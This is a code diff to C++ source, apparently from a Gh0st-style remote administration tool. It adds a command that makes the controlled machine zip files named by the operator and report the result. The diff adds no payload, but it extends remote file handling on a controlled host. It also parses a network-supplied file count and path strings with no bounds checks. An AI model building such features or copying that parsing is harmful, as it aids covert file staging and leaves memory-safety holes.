@@ -68,6 +68,7 @@ typedef struct
 enum
 {
 	COMMAND_COMPRESS_FILE_PARAM,
+	COMMAND_COMPRESS_MULTIPLE_FILES, // 新增  
 };
 
 extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);
@@ -164,6 +165,9 @@ void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		break;
 	case COMMAND_COMPRESS_FILE_PARAM:	// 被控端用(WinRAR)压缩或解压指定的文件(目录)
 		ExeCompress(lpBuffer + 1);
+		break;
+	case COMMAND_COMPRESS_MULTIPLE_FILES: // 多文件压缩  
+		ExeCompressMultiple(lpBuffer + 1);  
 		break;
 	case COMMAND_SEARCH_FILE:
 		SearchFile(lpBuffer + 1);
@@ -926,20 +930,147 @@ void CFileManager::Rename(LPBYTE lpBuffer)
 }
 
 //压缩解或压缩文件
-void CFileManager::ExeCompress(BYTE *lpBuffer)  
-{  
-    char* pszFilePath = (char*)lpBuffer;  
-    CString strInputPath = pszFilePath;  
-    CString strOutputPath = strInputPath + ".zip";  
-      
-    if (CreateZipArchive(strInputPath, strOutputPath))  
+void CFileManager::ExeCompress(BYTE *lpBuffer)    
+{    
+    char* pszFilePath = (char*)lpBuffer;    
+    CString strInputPath = pszFilePath;    
+	
+    // 获取输入文件/文件夹的父目录  
+    CString strOutputDir;  
+    int pos = strInputPath.ReverseFind('\\');  
+    if (pos != -1)  
+        strOutputDir = strInputPath.Left(pos + 1);  
+    else  
+        strOutputDir = "";  
+	
+    // 获取文件/文件夹名称  
+    CString fileName = strInputPath;  
+    if (pos != -1) fileName = fileName.Mid(pos + 1);  
+	
+    CString strOutputPath = strOutputDir + fileName + ".zip";  
+	
+    if (CreateZipArchive(strInputPath, strOutputPath))    
+    {    
+        SendToken(TOKEN_COMPRESS_FINISH);    
+    }    
+    else    
+    {    
+        SendToken(TOKEN_COMPRESS_ERROR);    
+    }    
+}
+
+void CFileManager::ExeCompressMultiple(BYTE *lpBuffer)    
+{    
+    // 解析文件数量  
+    int fileCount;  
+    memcpy(&fileCount, lpBuffer, sizeof(int));  
+    int offset = sizeof(int);  
+	
+    // 解析所有文件路径  
+    std::vector<CString> filePaths;  
+    for (int i = 0; i < fileCount; i++)  
     {  
-        SendToken(TOKEN_COMPRESS_FINISH);  
+        char* pszFilePath = (char*)(lpBuffer + offset);  
+        filePaths.push_back(CString(pszFilePath));  
+        offset += strlen(pszFilePath) + 1;  
+    }  
+	
+    if (filePaths.empty())   
+    {  
+        SendToken(TOKEN_COMPRESS_ERROR);  
+        return;  
+    }  
+	
+    // 获取第一个文件的父目录作为输出目录  
+    CString strFirstPath = filePaths[0];  
+    // 移除末尾的反斜杠（如果是目录标识）  
+    if (strFirstPath.Right(1) == "\\")  
+        strFirstPath = strFirstPath.Left(strFirstPath.GetLength() - 1);  
+	
+    CString strOutputDir;  
+    int pos = strFirstPath.ReverseFind('\\');  
+    if (pos != -1)  
+        strOutputDir = strFirstPath.Left(pos + 1);  // 包含最后的反斜杠  
+    else  
+        strOutputDir = "";  
+	
+    // 生成压缩包名称  
+    CString strOutputPath;  
+    if (filePaths.size() == 1)  
+    {  
+        // 单个文件/文件夹：使用其名称  
+        CString fileName = strFirstPath;  
+        int namePos = fileName.ReverseFind('\\');  
+        if (namePos != -1) fileName = fileName.Mid(namePos + 1);  
+        strOutputPath = strOutputDir + fileName + ".zip";  
     }  
     else  
     {  
-        SendToken(TOKEN_COMPRESS_ERROR);  
+        // 多文件时使用时间戳命名  
+        SYSTEMTIME st;  
+        GetLocalTime(&st);  
+        strOutputPath.Format("%sArchive_%04d%02d%02d_%02d%02d%02d.zip",   
+            strOutputDir, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);  
     }  
+	
+    if (CreateZipArchiveMultiple(filePaths, strOutputPath))    
+    {    
+        SendToken(TOKEN_COMPRESS_FINISH);    
+    }    
+    else    
+    {    
+        SendToken(TOKEN_COMPRESS_ERROR);    
+    }    
+}
+
+bool CFileManager::CreateZipArchiveMultiple(const std::vector<CString>& inputPaths, const CString& outputPath)    
+{    
+    FILE* zipFile = fopen(outputPath, "wb");    
+    if (!zipFile) return false;    
+	
+    std::vector<ZipCentralDirEntry> centralDir;    
+    std::vector<CString> filenames;    
+    DWORD centralDirOffset = 0;    
+	
+    bool success = true;  
+	
+    // 处理每个输入文件/目录  
+    for (size_t i = 0; i < inputPaths.size() && success; i++)  
+    {  
+        CString inputPath = inputPaths[i];  
+		
+        // 移除末尾的反斜杠（如果是目录标识）  
+        if (inputPath.Right(1) == "\\")  
+            inputPath = inputPath.Left(inputPath.GetLength() - 1);  
+		
+        DWORD attrs = GetFileAttributes(inputPath);    
+        if (attrs == INVALID_FILE_ATTRIBUTES) {    
+            success = false;  
+            break;  
+        }    
+		
+        if (attrs & FILE_ATTRIBUTE_DIRECTORY) {    
+            // 压缩目录，使用目录名作为根路径  
+            CString dirName = inputPath;  
+            int pos = dirName.ReverseFind('\\');  
+            if (pos != -1) dirName = dirName.Mid(pos + 1);  
+			
+            success = CompressDirectory(zipFile, inputPath, dirName, centralDir, filenames, centralDirOffset);    
+        } else {    
+            // 压缩单个文件  
+            CString fileName = inputPath;    
+            int pos = fileName.ReverseFind('\\');    
+            if (pos != -1) fileName = fileName.Mid(pos + 1);    
+            success = CompressFile(zipFile, inputPath, fileName, centralDir, filenames, centralDirOffset);    
+        }    
+    }  
+	
+    if (success) {    
+        WriteCentralDirectory(zipFile, centralDir, filenames, centralDirOffset);    
+    }    
+	
+    fclose(zipFile);    
+    return success;    
 }  
   
 bool CFileManager::CreateZipArchive(const CString& inputPath, const CString& outputPath)  
